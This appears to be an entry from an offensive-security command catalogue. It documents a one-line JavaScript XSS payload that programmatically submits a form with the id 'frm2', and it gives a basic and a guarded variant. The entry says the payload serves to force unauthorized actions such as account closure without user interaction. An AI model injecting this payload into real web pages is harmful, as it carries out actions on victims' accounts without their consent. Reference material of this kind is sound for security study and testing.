---
id: cmd-1043804-form-submit
data: document.getElementById('frm2').submit();
tags:
  - javascript
  - xss
  - form-submission
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.580Z'
verified: false
validated: true
submitted: true
---
# execute-form-submission-js

## Command

```javascript
document.getElementById('frm2').submit();
```

## Description

This JavaScript command locates a form element by its ID ('frm2') and programmatically submits it, useful in XSS contexts to perform unauthorized actions like account closure without user interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| getElementById | Selects DOM element by ID string | Yes |
| submit | Triggers the form's submission event | Yes |

## Examples

### Basic Usage

```javascript
document.getElementById('frm2').submit();
```

### Advanced Usage

```javascript
if (document.getElementById('frm2')) { document.getElementById('frm2').submit(); }
```

## Expected Output

The form submits as if clicked, sending data to the server (e.g., account closure request processed, no visible output in console unless errors occur).

## Related

- [[Related Procedure: Execute-Unauthorized-Form-Submission-via-XSS]]
